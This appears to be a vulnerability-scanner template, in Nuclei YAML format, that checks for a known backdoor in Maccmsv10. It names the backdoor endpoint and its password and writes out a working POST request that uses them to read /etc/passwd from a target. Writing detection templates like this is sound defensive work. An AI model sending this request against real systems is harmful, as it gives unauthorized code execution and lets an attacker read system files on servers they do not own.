id: maccmsv10-backdoor
info:
  name: Maccmsv10 - Backdoor Remote Code Execution
  author: princechaddha
  severity: critical
  description: Maccmsv10 has a backdoor that can be used by remote attackers to execute
    code through the '/index.php/bbs/index/download' endpoint and the 'getpwd' parameter
    with the value 'WorldFilledWithLove'.
  reference:
  - https://github.com/chaitin/xray/blob/master/pocs/maccmsv10-backdoor.yml
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: maccmsv10,rce,backdoor
  metadata:
    impact: The impact of the Maccmsv10 backdoor is that remote attackers can exploit
      it to execute code via the '/index.php/bbs/index/download' endpoint and the
      'getpwd' parameter value of 'WorldFilledWithLove'.
    recommendation: It is recommended to immediately update Maccmsv10 to the latest
      version to prevent remote attackers from exploiting the backdoor vulnerability
      and executing code.
requests:
- method: POST
  path:
  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
  body: getpwd=WorldFilledWithLove
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - "\u626B\u63CF\u540E\u95E8"
    - "\u53CD\u5F39\u7AEF\u53E3"
    - "\u6587\u4EF6\u7BA1\u7406"
    condition: and
  - type: status
    status:
    - 200
